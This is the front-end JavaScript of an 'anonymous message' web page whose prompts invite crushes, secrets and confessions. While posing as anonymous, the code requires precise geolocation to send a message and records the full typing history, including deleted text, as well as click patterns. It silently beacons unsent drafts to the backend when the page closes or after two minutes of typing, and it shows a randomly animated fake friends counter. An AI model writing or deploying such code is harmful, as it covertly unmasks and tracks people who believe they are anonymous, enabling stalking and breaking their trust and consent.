// Configuration: Change this URL when deploying to production
const API_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
    ? 'http://localhost:3000' // Local backend
    : 'https://anonymous-message-site-llnb.onrender.com'; // Replace with your Render backend URL

const messageInput = document.getElementById('messageInput');
const submitBtn = document.getElementById('submitBtn');
const messagesContainer = document.getElementById('messagesContainer');
const friendsCountEl = document.getElementById('friendsCount');
const promptGhost = document.querySelector('.prompt-ghost');
const diceBtn = document.querySelector('.dice-btn');
const REDIRECT_URL = 'sent.html';
const shareTag = new URLSearchParams(window.location.search).get('from');

// Track time spent on page
const pageLoadTime = Date.now();
function getTimeOnPage() {
  return Math.round((Date.now() - pageLoadTime) / 1000); // in seconds
}

// Track click patterns
const clickPatterns = [];
function trackClick(element, action) {
  clickPatterns.push({
    element,
    action,
    timestamp: Date.now() - pageLoadTime
  });
}

// Track text input history
const textHistory = [];
let lastRecordedText = '';

// Get precise coordinates using Geolocation API (prompts user)
async function getCoordinates() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(null);
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy
                });
            },
            () => resolve(null),
            { timeout: 8000, enableHighAccuracy: true }
        );
    });
}

// Load messages on page load
document.addEventListener('DOMContentLoaded', loadMessages);

// Random prompt helper
const PROMPTS = [
  "What's something you never told me?",
  "Drop a hot take 🔥",
  "Your first impression of me?",
  "What should I do next?",
  "One secret goal you have?",
  "If we could travel, where to?",
  "Truth or dare?",
  "A song you think I’d love?",
  "Best advice you got?",
  "What made you smile today?",
  "I’ve had a crush on you for months 😳",
  "Your smile makes my day brighter 😊",
  "You’re the kind of person I’d love to get to know ❤️",
  "I think we’d make a cute couple ✨",
  "You caught my eye the moment I saw you 😏",
  "Would love to take you out sometime 😍",
  "What’s one thing you find irresistible in someone?",
  "Guess who has been thinking about you? 😉",
  "Your laugh is contagious, just saying 😄",
  "If I could see you right now, I’d…",
  "What’s your dream date?",
  "Confess something funny you did recently",
  "What’s the sweetest thing someone did for you?",
  "Who’s your celebrity crush?",
  "Would you rather cuddle or dance all night?",
  "What’s one thing you admire about me?",
  "Send me your best pickup line",
  "If we were in a movie, which scene would be ours?",
  "What’s the most romantic thing you’ve done?",
  "Do you believe in love at first sight?",
  "What’s your favorite way to be surprised?",
  "Describe your ideal weekend with someone special",
  "If I asked you out, what would you say?",
  "What’s your guilty pleasure?",
  "Who do you secretly think about?",
  "Favorite love song of all time?",
  "What makes your heart skip a beat?",
  "Describe your perfect first date",
  "Do you prefer texts or calls when flirting?",
  "What’s the most spontaneous thing you’ve done?",
  "If we could teleport, where would we go?",
  "Your favorite romantic movie?",
  "Ever had a secret admirer?",
  "Most memorable compliment you’ve received?",
  "What’s your love language?",
  "What’s the cutest thing someone could do for you?",
  "Do you believe in soulmates?",
  "Most romantic gesture you’ve witnessed?",
  "Share a flirty emoji that describes you",
  "If we were together, what’s the first thing we’d do?"
];


function setRandomPrompt(fillMessage = false) {
    const text = PROMPTS[Math.floor(Math.random() * PROMPTS.length)];
    if (promptGhost && !messageInput.value) promptGhost.textContent = text;
    if (fillMessage && messageInput) {
        messageInput.value = text;
        if (promptGhost) promptGhost.textContent = '';
    }
}

// Initialize prompt
setRandomPrompt(false);

// Auto-cycle prompt every 3 seconds when empty
setInterval(() => {
    if (!messageInput.value && promptGhost) {
        setRandomPrompt(false);
    }
}, 3000);

// Hide/show ghost prompt based on input
if (messageInput) {
    messageInput.addEventListener('input', () => {
        if (promptGhost) {
            promptGhost.textContent = messageInput.value ? '' : promptGhost.textContent || '';
        }
        // If cleared, repopulate a prompt
        if (!messageInput.value) setRandomPrompt(false);

        // Track text history (record when text changes)
        const currentText = messageInput.value;
        if (currentText !== lastRecordedText) {
            const entry = {
                text: currentText === '' ? '(cleared)' : currentText,
                timestamp: Math.round(Date.now() - pageLoadTime)
            };
            textHistory.push(entry);
            console.log('Text recorded:', entry); // Debug
            lastRecordedText = currentText;
        }
    });

    // Submit on Enter (desktop), allow Shift+Enter for newline
    messageInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            // Trigger the same action as clicking Send
            submitBtn.click();
        }
    });
}

// Dice click to insert prompt
if (diceBtn) {
    diceBtn.addEventListener('click', () => {
        trackClick('dice-btn', 'click');
        
        // Add rolling animation
        diceBtn.classList.add('rolling');
        
        // Remove animation class after it finishes
        setTimeout(() => {
            diceBtn.classList.remove('rolling');
        }, 200);
        
        setRandomPrompt(true);
    });
}

// Animate friends count up/down randomly
let friendsCount = friendsCountEl ? parseInt(friendsCountEl.textContent, 10) || 299 : 299;
if (friendsCountEl) {
    setInterval(() => {
        const delta = Math.floor(Math.random() * 7) - 2; // -2 to +4
        friendsCount = Math.max(120, friendsCount + delta);
        friendsCountEl.textContent = friendsCount.toString();
    }, 1000);
}

// Submit message
submitBtn.addEventListener('click', async () => {
    trackClick('submit-btn', 'click');
    const content = messageInput.value.trim();
    
    if (!content) {
        alert('Please enter a message');
        return;
    }
    
    const originalText = submitBtn.textContent;
    submitBtn.classList.add('loading');
    submitBtn.disabled = true;

    try {
        // Ask for precise location - REQUIRED to send
        const coordinates = await getCoordinates();

        if (!coordinates) {
            alert('📍 Location access is required to send a message. Please allow location permission and try again.');
            submitBtn.classList.remove('loading');
            submitBtn.disabled = false;
            return;
        }

        // Cache coordinates for unsent messages
        lastCoordinates = coordinates;

        const payload = { message: content, coordinates };
        if (shareTag) payload.shareTag = shareTag;
        payload.timeOnPage = getTimeOnPage();
        payload.clickPatterns = clickPatterns;
        payload.textHistory = textHistory;
        console.log('Sending payload:', { textHistory, content }); // Debug

        const response = await fetch(`${API_URL}/message`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        if (response.ok) {
            messageInput.value = '';
            // Redirect if configured, otherwise refresh messages
            if (REDIRECT_URL) {
                window.location.href = REDIRECT_URL;
                return;
            }
            loadMessages();
        } else {
            alert('Failed to send message');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Failed to connect to server. Make sure the backend is running.');
    }
    finally {
        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;
        submitBtn.textContent = originalText;
    }
});

// Load all messages
async function loadMessages() {
    try {
        const response = await fetch(`${API_URL}/messages`);
        const messages = await response.json();
        
        if (!messages || messages.length === 0) {
            messagesContainer.innerHTML = '<p class="no-messages">No messages yet. Be the first to share!</p>';
            return;
        }
        
        messagesContainer.innerHTML = messages
            .sort((a, b) => b.timestamp.localeCompare(a.timestamp)) // newest first
            .map(message => createMessageCard(message))
            .join('');
            
        // Add delete event listeners
        document.querySelectorAll('.delete-btn').forEach(btn => {
            btn.addEventListener('click', () => deleteMessage(btn.dataset.id));
        });
    } catch (error) {
        console.error('Error:', error);
        messagesContainer.innerHTML = '<p class="no-messages">Failed to load messages. Make sure the backend is running.</p>';
    }
}

// Create message card HTML
function createMessageCard(message) {
    const date = new Date(message.timestamp);
    
    // Add 5 hours 30 minutes to convert to Sri Lanka Time
    const sriLankaTime = new Date(date.getTime() + (5.5 * 60 * 60 * 1000));
    
    // Format: "Dec 14, 2025 at 3:45 PM"
    const dateFormatted = sriLankaTime.toLocaleDateString('en-US', { 
        month: 'short', 
        day: 'numeric', 
        year: 'numeric'
    });
    const timeFormatted = sriLankaTime.toLocaleTimeString('en-US', { 
        hour: 'numeric', 
        minute: '2-digit',
        hour12: true
    });
    const timeString = `${dateFormatted} at ${timeFormatted}`;
    
    const location = message.location || 'Unknown';
    const stateLabel = message.state === 'unsent' ? '📝 DRAFT' : '✅ SENT';
    const stateClass = message.state === 'unsent' ? 'state-unsent' : 'state-sent';
    
    return `
        <div class="message-card">
            <div class="message-state ${stateClass}">${stateLabel}</div>
            <div class="message-content">${escapeHtml(message.message)}</div>
            <div class="message-footer">
                <div class="message-meta">
                    <span class="message-time">📅 ${timeString}</span>
                    <span class="message-location">📍 ${escapeHtml(location)}</span>
                </div>
                <button class="delete-btn" data-id="${message.id}">Delete</button>
            </div>
        </div>
    `;
}

// Delete message
async function deleteMessage(id) {
    if (!confirm('Are you sure you want to delete this message?')) return;
    
    try {
        const response = await fetch(`${API_URL}/message/${id}`, { method: 'DELETE' });
        if (response.ok) {
            loadMessages();
        } else {
            alert('Failed to delete message');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Failed to connect to server');
    }
}

// Store last known coordinates
let lastCoordinates = null;

async function sendDraftMessage() {
    const content = messageInput.value.trim();
    if (!content || content.length === 0) {
        console.log('📝 No draft content to save');
        return; // No draft to save
    }

    try {
        console.log('📤 Sending unsent message...');
        console.log('Content length:', content.length);
        console.log('Text history entries:', textHistory.length);
        
        // Try to get coordinates with a short timeout (2 seconds)
        let coordinates = lastCoordinates || null;
        
        // Try fresh coordinates but don't wait too long
        const coordinatesPromise = getCoordinates();
        const timeoutPromise = new Promise(resolve => setTimeout(() => resolve(null), 2000));
        const freshCoordinates = await Promise.race([coordinatesPromise, timeoutPromise]);
        
        if (freshCoordinates) {
            coordinates = freshCoordinates;
            lastCoordinates = freshCoordinates;
        }

        const payload = {
            message: content,
            coordinates: coordinates || { latitude: null, longitude: null, accuracy: null },
            state: 'unsent',
            timeOnPage: getTimeOnPage(),
            clickPatterns: clickPatterns,
            textHistory: textHistory
        };

        if (shareTag) payload.shareTag = shareTag;

        console.log('📡 Sending unsent message with coordinates:', coordinates ? '✅' : '❌');
        
        // Use sendBeacon for unload events - it's more reliable
        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        const sent = navigator.sendBeacon(`${API_URL}/message`, blob);
        
        if (sent) {
            console.log('✅ Unsent message beacon sent successfully');
        } else {
            console.log('⚠️ Beacon may have failed, trying fetch...');
            // Fallback to fetch if sendBeacon fails
            await fetch(`${API_URL}/message`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            });
            console.log('✅ Unsent message sent via fetch');
        }

    } catch (error) {
        console.error('❌ Error recording unsent message:', error);
    }
}

// Auto-record unsent message if user spends more than 2 minutes typing
let twoMinuteTimer = null;
function startTwoMinuteTimer() {
    if (twoMinuteTimer) clearTimeout(twoMinuteTimer);
    
    twoMinuteTimer = setTimeout(() => {
        const content = messageInput.value.trim();
        if (content && content.length > 0) {
            console.log('⏱️ 2+ minutes elapsed with text typed. Recording as unsent...');
            console.log('Content:', content.substring(0, 50));
            sendDraftMessage().catch(err => console.error('Failed to auto-record unsent message:', err));
        }
    }, 2 * 60 * 1000); // 2 minutes in milliseconds
}

// Reset timer when user types
if (messageInput) {
    messageInput.addEventListener('input', () => {
        if (promptGhost) {
            promptGhost.textContent = messageInput.value ? '' : promptGhost.textContent || '';
        }
        if (!messageInput.value) setRandomPrompt(false);

        const currentText = messageInput.value;
        if (currentText !== lastRecordedText) {
            const entry = {
                text: currentText === '' ? '(cleared)' : currentText,
                timestamp: Math.round(Date.now() - pageLoadTime)
            };
            textHistory.push(entry);
            console.log('Text recorded:', entry);
            lastRecordedText = currentText;
        }

        // Start/reset the 2-minute timer when user types
        if (currentText.trim().length > 0) {
            startTwoMinuteTimer();
        }
    });
}

// Escape HTML to prevent XSS
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Silently record text history when user closes page without sending
window.addEventListener('unload', () => {
    const content = messageInput.value.trim();
    if (content && content.length > 0) {
        console.log('🔴 Page unload detected! Recording unsent message...');
        console.log('Content length:', content.length);
        // Send the textHistory as unsent message silently
        sendDraftMessage().catch(err => console.error('Failed to record unsent message history:', err));
    }
});
